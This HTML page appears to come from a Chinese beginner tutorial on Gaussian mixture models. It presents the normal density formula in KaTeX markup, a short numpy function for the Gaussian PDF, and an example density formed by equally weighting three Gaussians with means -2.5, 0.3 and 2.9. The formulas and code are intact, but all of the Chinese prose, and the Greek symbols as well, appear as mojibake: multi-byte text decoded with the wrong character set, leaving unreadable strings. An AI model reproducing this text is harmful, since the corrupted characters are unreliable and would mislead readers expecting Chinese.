<p>è¿™æ˜¯ä¸€ç¯‡é¢å‘åˆå­¦è€…çš„æ•™ç¨‹ï¼Œæœ¬æ–‡å°†é‡ç‚¹æ”¾åœ¨æ··åˆé«˜æ–¯åˆ†å¸ƒçš„<strong>æ ¸å¿ƒæ¦‚å¿µ</strong>ä¸<strong>æ•°å­¦æµç¨‹</strong>çš„æ¢³ç†ä¸Šï¼Œå¹¶ä¼šæ‰‹æŠŠæ‰‹å¸¦ä½ ç”¨ä»£ç å®Œæˆä¸€ä¸ªå®é™…çš„åº”ç”¨ç¤ºä¾‹ã€‚è‡³äºæ›´æ·±å±‚çš„æ•°å­¦æ€æƒ³ä¸æ¨¡å‹è®¾è®¡æ–¹æ³•æŠ€å·§ï¼Œæœ¬æ–‡æš‚ä¸æ·±å…¥è®¨è®ºï¼Œä»¥å¸®åŠ©å¤§å®¶æ›´å¿«ä¸Šæ‰‹ã€ç†è§£è¯¥æ¨¡å‹çš„æ ¸å¿ƒç”¨æ³•ã€‚</p>
<p><em>æœ¬æ–‡ä¸­å±•ç¤ºçš„ç¤ºæ„å›¾å‡ä¸ºä½œè€…ä½¿ç”¨matplotlibåŸåˆ›ç»˜åˆ¶ã€‚è¯»è€…å¯è‡ªç”±åˆ†äº«ä½¿ç”¨ï¼Œä½†ä½¿ç”¨æ—¶è¯·æ³¨æ˜å‡ºå¤„ã€‚</em></p>
<hr/>
<p>æˆ‘ä»¬ä»æœ€åŸºç¡€çš„é«˜æ–¯åˆ†å¸ƒï¼ˆä¹Ÿç§°æ­£æ€åˆ†å¸ƒï¼‰è¯´èµ·ã€‚ä»¥ä¸‹è¿™ä¸ªæ¦‚ç‡å¯†åº¦å‡½æ•°æƒ³å¿…å¤§å®¶å†ç†Ÿæ‚‰ä¸è¿‡äº†ï¼Œå®ƒä¸ä»…æ˜¯æ¦‚ç‡è®ºä¸ç»Ÿè®¡ä¸­çš„æ ¸å¿ƒåˆ†å¸ƒï¼Œä¹Ÿæ˜¯æœºå™¨å­¦ä¹ ä¼—å¤šæ¨¡å‹çš„åŸºçŸ³ï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">âˆ£</mi><mi>Î¼</mi><mo separator="true">,</mo><mi>Ïƒ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><msqrt><mrow><mn>2</mn><mi>Ï€</mi></mrow></msqrt><mi>Ïƒ</mi></mrow></mfrac><msup><mi>e</mi><mfrac><mrow><mo>âˆ’</mo><mo stretchy="false">(</mo><mi>x</mi><mo>âˆ’</mo><mi>Î¼</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msup><mi>Ïƒ</mi><mn>2</mn></msup></mrow></mfrac></msup></mrow><annotation encoding="application/x-tex">\mathcal{N}(x|\mu,\sigma) = \frac{1}{\sqrt{2\pi}\sigma} e^{\frac{-(x-\mu )^{2}}{2\sigma^{2}} }</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord">âˆ£</span><span class="mord mathnormal">Î¼</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.2591em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.2028em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9072em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03588em;">Ï€</span></span></span><span style="top:-2.8672em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.1328em;"><span/></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.3291em;"><span style="top:-3.4534em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.251em;"><span style="top:-2.5062em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">Ïƒ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384em;"><span style="top:-2.9384em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"/><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"/><span class="frac-line mtight" style="border-bottom-width:0.049em;"/></span><span style="top:-3.5021em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight">Î¼</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0484em;"><span style="top:-3.0484em;margin-right:0.1em;"><span class="pstrut" style="height:2.6444em;"/><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4938em;"><span/></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"/></span></span></span></span></span></span></span></span></span></span></span></span></span></div>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/634b6fff2389458db73b59ee44a419b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=WZGRqEFuFO8nYrItKROgtaNfngA%3D" alt="c1.jpg" loading="lazy"/></p>
<p>å³ä½¿ä½ ä¹‹å‰å·²ç»å­¦è¿‡ï¼Œæˆ‘ä»¬è¿™é‡Œä¸å¦¨ä¸€èµ·å›é¡¾ä¸€ä¸‹å®ƒçš„å‡ ä¸ªå…³é”®ç‰¹æ€§ã€‚è¯¥åˆ†å¸ƒæ˜¯å…³äº<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>çš„å‡½æ•°ï¼Œå¹¶ç”±ä¸¤ä¸ªå‚æ•°å†³å®šï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¼</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Î¼</span></span></span></span></span>ï¼šå‡å€¼ï¼Œå†³å®šåˆ†å¸ƒçš„ä¸­å¿ƒä½ç½®ï¼Œå³å¯¹ç§°è½´æ‰€åœ¨ï¼›ï¼ˆè¯»éŸ³ä¸ºmu|ç¼ªï¼‰</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span>ï¼šæ ‡å‡†å·®ï¼Œæ§åˆ¶åˆ†å¸ƒçš„ç¦»æ•£ç¨‹åº¦ï¼›ï¼ˆè¯»éŸ³ä¸ºsigma | Cä¸ªç ï¼‰</li>
</ul>
<p>å…·ä½“æ¥è¯´ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span> è¶Šå¤§ï¼Œæ›²çº¿è¶Šâ€œçŸ®èƒ–â€ï¼Œæ•°æ®è¶Šåˆ†æ•£ï¼›<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span> è¶Šå°ï¼Œæ›²çº¿è¶Šâ€œé«˜ç˜¦â€ï¼Œæ•°æ®è¶Šé›†ä¸­ã€‚ä¸‹å›¾ç›´è§‚å±•ç¤ºäº†å¯¹ä¸åŒ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¼</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Î¼</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span> æ—¶åˆ†å¸ƒå½¢æ€çš„å˜åŒ–ï¼š</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f1a00a83f7d499ca2e14a4e10994b03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=jN7U7uJXyvTU0yi7FdLBX82fFk4%3D" alt="c2.jpg" loading="lazy"/></p>
<p>ç”¨pythonå®ç°è¿™ä¸ªé«˜æ–¯åˆ†å¸ƒå‡½æ•°ä¹Ÿéå¸¸ç®€å•ï¼Œå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">def</span> <span class="hljs-title function_">gaussian_pdf_compact</span>(<span class="hljs-params">x, mu, sigma</span>):
    <span class="hljs-keyword">return</span> np.exp(-<span class="hljs-number">0.5</span> * ((x - mu) / sigma) ** <span class="hljs-number">2</span>) / (sigma * np.sqrt(<span class="hljs-number">2</span> * np.pi))
</code></pre>
<p>ç°åœ¨ï¼Œè€ƒè™‘ä¸‹é¢è¿™æ ·çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼Œä½ èƒ½å¦è¯†åˆ«å®ƒå±äºå“ªç§å·²çŸ¥åˆ†å¸ƒï¼Ÿæˆ–è€…ï¼Œä½ èƒ½å†™å‡ºå®ƒçš„æ¦‚ç‡å¯†åº¦å‡½æ•°è¡¨è¾¾å¼<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span>å—ï¼Ÿ</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8835392a835f40fe94ff466dda90c1eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=bFhfGky%2BTocSiM5FI6zVtMPwD1w%3D" alt="c3.jpg" width="70%" loading="lazy"/></p>
<p>æ˜¾ç„¶ï¼Œè¿™å¹¶ä¸æ˜¯æˆ‘ä»¬å¸¸è§çš„å•ä¸€æ¦‚ç‡åˆ†å¸ƒï¼ˆå¦‚æ³Šæ¾åˆ†å¸ƒã€å‡åŒ€åˆ†å¸ƒç­‰ï¼‰ï¼Œè€Œæ˜¯ä¸€ä¸ªå½¢æ€å¤æ‚çš„éæ ‡å‡†æ¦‚ç‡å¯†åº¦å‡½æ•°ã€‚ç„¶è€Œï¼Œæœ‰è¶£çš„æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°å®é™…ä¸Šæ˜¯ç”±ä¸‰ä¸ªä¸åŒçš„é«˜æ–¯åˆ†å¸ƒï¼ˆæ­£æ€åˆ†å¸ƒï¼‰ç»è¿‡åŠ æƒå åŠ è€Œæˆçš„ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒçš„æ•°å­¦è¡¨è¾¾å¼å¯ä»¥å†™ä¸ºï¼š</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>Ã—</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>âˆ£</mo><mo>âˆ’</mo><mn>2.5</mn><mo separator="true">,</mo><mn>0.9</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>Ã—</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>âˆ£</mo><mn>0.3</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">)</mo><mo>+</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo>Ã—</mo><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>âˆ£</mo><mn>2.9</mn><mo separator="true">,</mo><mn>1.2</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x) = \frac{1}{3} \times \mathcal{N}(x \mid -2.5,0.9) + \frac{1}{3} \times \mathcal{N}(x \mid0.3,2) + \frac{1}{3} \times \mathcal{N}(x \mid 2.9,1.2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">âˆ’</span><span class="mord">2.5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">0.9</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">0.3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">2</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">2.9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord">1.2</span><span class="mclose">)</span></span></span></span></span></div>
<p>å…¶ä¸­ï¼Œ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>x</mi><mo>âˆ£</mo><mi>Î¼</mi><mo separator="true">,</mo><mi>Ïƒ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(x \mid \mu,\sigma)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathcal" style="margin-right:0.14736em;">N</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">âˆ£</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">Î¼</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span><span class="mclose">)</span></span></span></span></span>è¡¨ç¤ºå‡å€¼ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Î¼</mi></mrow><annotation encoding="application/x-tex">\mu</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Î¼</span></span></span></span></span>ï¼Œæ ‡å‡†å·®ä¸º<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ïƒ</mi></mrow><annotation encoding="application/x-tex">\sigma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">Ïƒ</span></span></span></span></span>çš„é«˜æ–¯åˆ†å¸ƒæ¦‚ç‡å¯†åº¦å‡½æ•°ã€‚ä¸‹å›¾ç›´è§‚å±•ç¤ºäº†è¿™ä¸‰ä¸ªé«˜æ–¯åˆ†é‡(è™šçº¿)ä»¥åŠå®ƒä»¬å åŠ åçš„æ€»å¯†åº¦å‡½æ•°(è“è‰²å®çº¿)</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7cfa5784f6d46fd81f01c85138dc7bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541770&amp;x-signature=Ym%2FI69KxLpc%2Bm2lelUZPzkVViq8%3D" alt="c4.jpg" loading="lazy"/></p>
<p>é€šè¿‡è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è‡ªç„¶ä¼šäº§ç”Ÿä¸€ä¸ªçŒœæƒ³ï¼šæ˜¯å¦ä»»æ„å¤æ‚çš„æ¦‚ç‡å¯†åº¦å‡½æ•°éƒ½å¯ä»¥ç”¨å¤šä¸ªé«˜æ–¯åˆ†å¸ƒçš„åŠ æƒå’Œæ¥è¿‘ä¼¼è¡¨ç¤ºï¼Ÿæˆ–è€…æ¢ä¸ªè¯´æ³•ï¼Œæ˜¯å¦ä»»ä½•æ¦‚ç‡å¯†åº¦å‡½æ•°éƒ½å¯ä»¥åˆ†è§£ä¸ºè‹¥å¹²ä¸ªé«˜æ–¯åˆ†å¸ƒçš„çº¿æ€§ç»„åˆï¼Ÿ</p>
<p>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œè¿™åœ¨ç†è®ºä¸Šæœ‰ç€åšå®çš„åŸºç¡€ã€‚å®é™…ä¸Šï¼Œåªè¦æœ‰è¶³å¤Ÿå¤šçš„é«˜æ–¯åˆ†å¸ƒé€šè¿‡é€‚å½“åŠ æƒï¼Œå°±å¯ä»¥ä»¥ä»»æ„ç²¾åº¦é€¼è¿‘ä»»ä½•å¹³æ»‘çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ã€‚è¿™æ­£æ˜¯æ··åˆé«˜æ–¯æ¨¡å‹ï¼ˆGaussian Mixture Model, GMMï¼‰çš„æ ¸å¿ƒæ€æƒ³ã€‚<strong>æ··åˆé«˜æ–¯æ¨¡å‹ï¼Œæˆ–è€…è¯´GMMèšç±»ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå°†ä»»æ„æ¦‚ç‡å¯†åº¦å‡½æ•°åˆ†è§£æˆå¤šä¸ªé«˜æ–¯åˆ†å¸ƒçš„ç®—æ³•ã€‚</strong></p>
<p>ä½†æ˜¯ï¼Œè¯·ä¸è¦å¿˜è®°ï¼Œæ¦‚ç‡å¯†åº¦å‡½æ•°å¹¶ä¸ä»…é™äºä¸€ç»´æ•°æ®ã€‚ä¸Šé¢æ‰€å±•ç¤ºçš„ä¾‹å­éƒ½æ˜¯å…³äº<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>çš„å¯†åº¦å‡½æ•°ï¼Œå› ä¸ºåªæœ‰ä¸€ä¸ªå˜é‡<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span>ï¼Œå› æ­¤å®ƒä»¬éƒ½æ˜¯ä¸€ç»´çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ã€‚å¦‚æœæœ‰å¤šä¸ªå˜é‡ï¼Œæ˜¯äºŒç»´ï¼Œä¸‰ç»´ï¼Œç”šè‡³æ˜¯æ›´é«˜çš„ç»´åº¦çš„æ¦‚ç‡å¯†åº¦å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å°†å…¶åˆ†è§£ä¸ºå¤šä¸ªé«˜æ–¯åˆ†å¸ƒçš„æ··åˆå‘¢ï¼Ÿæˆ‘ä»¬å…ˆä¸ç”¨çœ‹çš„é‚£ä¹ˆè¿œï¼Œä¸å¦¨å…ˆæƒ³æƒ³ï¼ŒäºŒç»´çš„é«˜æ–¯åˆ†å¸ƒé•¿å•¥æ ·ï¼Œä¸‰ç»´çš„é«˜æ–¯åˆ†å¸ƒåˆé•¿å•¥æ ·ï¼Ÿå®ƒä»¬å…¬å¼åˆè¯¥æ€ä¹ˆå†™å‘¢ï¼Ÿ</p>
